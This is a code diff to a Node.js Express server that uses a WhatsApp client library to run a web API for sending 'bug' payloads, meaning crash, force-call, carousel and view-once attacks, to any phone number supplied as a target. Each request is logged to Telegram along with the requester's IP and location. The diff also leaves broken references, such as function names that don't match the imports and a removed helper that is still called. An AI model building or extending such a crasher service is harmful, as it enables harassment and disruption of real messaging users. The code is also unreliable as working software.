@@ -29,45 +29,35 @@ const {
 const pino = require('pino');
 const readline = require("readline");
 const fs = require('fs');
+const os = require('os');
 const express = require("express");
 const bodyParser = require('body-parser');
 const cors = require("cors");
 const path = require("path");
+const axios = require('axios');
 
 const app = express();
-const PORT = process.env.PORT || 5036
+const PORT = process.env.PORT || 5036;
 
-const { XanfcXscary, XcrashXann, fo1, bugCrash} = require('./bugs');
+const { XanfcXscary, XcrashXann, fo1, bugCrash } = require('./bugs');
 const { getRequest, sendTele } = require('./telegram');
+
+// --- Global Variables & Store ---
+const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
+const pairingCodes = new Map(); // Untuk menyimpan kode pairing sementara
 
 app.enable("trust proxy");
 app.set("json spaces", 2);
 app.use(cors());
-app.use(express.urlencoded({
-    extended: true
-}));
+app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
-app.use(bodyParser.raw({
-    limit: '50mb',
-    type: '*/*'
-}));
+app.use(bodyParser.raw({ limit: '50mb', type: '*/*' }));
 
-const { Boom } = require('@hapi/boom');
-const usePairingCode = true;
 
-const question = (text) => {
-    const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout
-    });
-    return new Promise((resolve) => {
-        rl.question(text, resolve);
-    });
-};
-
+// --- Fungsi Utama untuk Menghubungkan Klien Baileys ---
 async function clientstart() {
-    const { state, saveCreds } = await useMultiFileAuthState(`./session`);
+	const { state, saveCreds } = await useMultiFileAuthState(`./session`)
     const { version, isLatest } = await fetchLatestBaileysVersion();
     const client = makeWASocket({
         logger: pino({ level: "silent" }),
@@ -75,126 +65,84 @@ async function clientstart() {
         auth: state,
         browser: ["Ubuntu", "Chrome", "20.0.00"]
     });
-
+      
     if (!client.authState.creds.registered) {
-        const phoneNumber = await question('please enter your WhatsApp number, starting with 62:\n> ');
-        const code = await client.requestPairingCode(phoneNumber, "12341234");
-        console.log(`your pairing code: ${code}`);
+        const phoneNumber = await question('please enter your WhatsApp number, starting with 62:\n> ');  
+        const code = await client.requestPairingCode(phoneNumber, "KIUU1234");  
+        console.log(`your pairing code: ${code}`);  
     }
 
-    app.get('/api/status', (req, res) => {
+    // --- API Endpoints ---
+    app.get('/', (req, res) => {
+        res.sendFile(path.join(__dirname, 'index.html'));
+    });
+
+    app.get('/api/status', async (req, res) => {
         try {
-            if (client.user?.id) {
-                res.json({ status: 'Online', user: client.user.id });
-            } else {
-                res.json({ status: 'Offline' });
+            const memUsage = process.memoryUsage();
+            const totalRam = os.totalmem();
+            const info = await getRequest(req);
+            res.status(200).json({
+                status: true,
+                botStatus: client.connection === 'open' ? 'online' : 'offline',
+                cpuLoad: os.loadavg()[0].toFixed(2),
+                ramUsage: memUsage.rss,
+                totalRam: totalRam,
+                location: info.location
+            });
+        } catch (error) {
+            res.status(500).json({ status: false, error: error.message });
+        }
+    });
+
+    app.get('/api/bug/:type', async (req, res) => {
+        const { type } = req.params;
+        const { target } = req.query;
+        if (!target) {
+            return res.status(400).json({ status: false, error: "Nomor target tidak ditemukan." });
+        }
+
+        const bugFunctions = {
+            fo1,
+            bugCrash,
+            xanfcxscary,
+            xcrashxann
+        };
+
+        if (bugFunctions[type]) {
+            try {
+                await bugFunctions[type](client, `${target}@s.whatsapp.net`);
+                const info = await getRequest(req);
+                const logMessage = `*Permintaan Bug Terkirim*\nJenis Bug: ${type}\nTarget: ${target}\nIP Pengirim: ${info.ip}\nLokasi: ${info.location}\nTanggal: ${info.timestamp}`;
+                sendTele(logMessage);
+                res.status(200).json({ status: true, message: `Bug ${type} berhasil dikirim ke ${target}` });
+            } catch (error) {
+                console.error(error);
+                res.status(500).json({ status: false, error: `Gagal mengirim bug: ${error.message}` });
             }
-        } catch (error) {
-            res.status(500).json({ status: 'Error', message: 'Failed to get status' });
+        } else {
+            res.status(404).json({ status: false, error: "Jenis bug tidak ditemukan." });
         }
     });
 
-    app.get('/api/bug/carousels', async (req, res) => {
-        const { target, fjids } = req.query;
-        if (!target) return res.status(400).json({ status: false, message: "parameter target diperlukan" });
-        if (!fjids) return res.status(400).json({ status: false, message: "parameter fjids diperlukan" });
-        let bijipeler = target.replace(/[^0-9]/g, "");
-        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
-        
-        let cuki = bijipeler + '@s.whatsapp.net';
-        const info = await getRequest(req);
-        try {
-            await XcrashXann(client, cuki, fjids);
-            res.json({ status: true, creator: global.creator, result: "sukses" });
-            console.log(`successfully sent carousels to number ${cuki}`);
-            const logMessage = `\n[API HIT]\n\nEndpoint: Carousels\nTarget: ${target}\nIP: ${info.ip}\nMethod: ${info.method}\n\nthis is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable\n\n${info.timestamp}`;
-            sendTele(logMessage);
-        } catch (error) {
-            console.error(error);
-            res.status(500).json({ status: false, error: error.message });
+    app.post('/api/pair', async (req, res) => {
+        const { target } = req.body;
+        if (!target) {
+            return res.status(400).json({ status: false, error: 'Nomor target tidak ditemukan' });
+        }
+
+        const phoneNumber = target.replace(/[^0-9]/g, '');
+        if (!client.authState.creds.registered) {
+            pairingCodes.set(phoneNumber, true);
+            const qr = await client.requestPairingCode(phoneNumber);
+            return res.status(200).json({ status: true, message: 'Kode pairing berhasil dibuat', code: qr });
+        } else {
+            return res.status(400).json({ status: false, error: 'Bot sudah terhubung dengan perangkat lain.' });
         }
     });
-
-    app.get('/api/bug/forcecall', async (req, res) => {
-        const { target } = req.query;
-        if (!target) return res.status(400).json({ status: false, message: "parameter target diperlukan" });
-        let bijipeler = target.replace(/[^0-9]/g, "");
-        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
-        
-        let cuki = bijipeler + '@s.whatsapp.net';
-        const info = await getRequest(req);
-        try {
-            await XanfcXscary(client, cuki);
-            res.json({ status: true, creator: global.creator, result: "sukses" });
-            console.log(`successfully sent forcecall to number ${cuki}`);
-            const logMessage = `\n[API HIT]\n\nEndpoint: Forcecall\nTarget: ${target}\nIP: ${info.ip}\nMethod: ${info.method}\n\nthis is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable\n\n${info.timestamp}`;
-            sendTele(logMessage);
-        } catch (error) {
-            console.error(error);
-            res.status(500).json({ status: false, error: error.message });
-        }
-    });
-
-    app.get('/api/bug/fo1', async (req, res) => {
-        const { target } = req.query;
-        if (!target) return res.status(400).json({ status: false, message: "parameter target diperlukan" });
-        let bijipeler = target.replace(/[^0-9]/g, "");
-        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
-        
-        let cuki = bijipeler + '@s.whatsapp.net';
-        const info = await getRequest(req);
-        try {
-            await fo1(client, cuki);
-            res.json({ status: true, creator: global.creator, result: "sukses" });
-            console.log(`successfully sent fo1 to number ${cuki}`);
-            const logMessage = `\n[API HIT]\n\nEndpoint: ViewOnceMessage\nTarget: ${target}\nIP: ${info.ip}\nMethod: ${info.method}\n\nthis is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable\n\n${info.timestamp}`;
-            sendTele(logMessage);
-        } catch (error) {
-            console.error(error);
-            res.status(500).json({ status: false, error: error.message });
-        }
-    });
-
-    app.get('/api/bug/crash', async (req, res) => {
-        const { target } = req.query;
-        if (!target) return res.status(400).json({ status: false, message: "parameter target diperlukan" });
-        let bijipeler = target.replace(/[^0-9]/g, "");
-        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
-        
-        let cuki = bijipeler + '@s.whatsapp.net';
-        const info = await getRequest(req);
-        try {
-            await bugCrash(client, cuki);
-            res.json({ status: true, creator: global.creator, result: "sukses" });
-            console.log(`successfully sent crash to number ${cuki}`);
-            const logMessage = `\n[API HIT]\n\nEndpoint: Crash\nTarget: ${target}\nIP: ${info.ip}\nMethod: ${info.method}\n\nthis is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable\n\n${info.timestamp}`;
-            sendTele(logMessage);
-        } catch (error) {
-            console.error(error);
-            res.status(500).json({ status: false, error: error.message });
-        }
-    });
-
-    client.ev.on('connection.update', (update) => {
-        const { konek } = require('./connect');
-        konek({
-            client,
-            update,
-            clientstart,
-            DisconnectReason,
-            Boom
-        });
-    });
-
-    client.ev.on('creds.update', saveCreds);
-    return client;
 }
 
 clientstart();
-
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
 
 app.listen(PORT, () => {
     console.log(`Server is running on http://localhost:${PORT}`);
@@ -208,12 +156,4 @@ app.listen(PORT, () => {
     } else {
         console.error('An error occurred:', err.message);
     }
-});
-
-let file = require.resolve(__filename);
-require('fs').watchFile(file, () => {
-    require('fs').unwatchFile(file);
-    console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m');
-    delete require.cache[file];
-    require(file);
 });
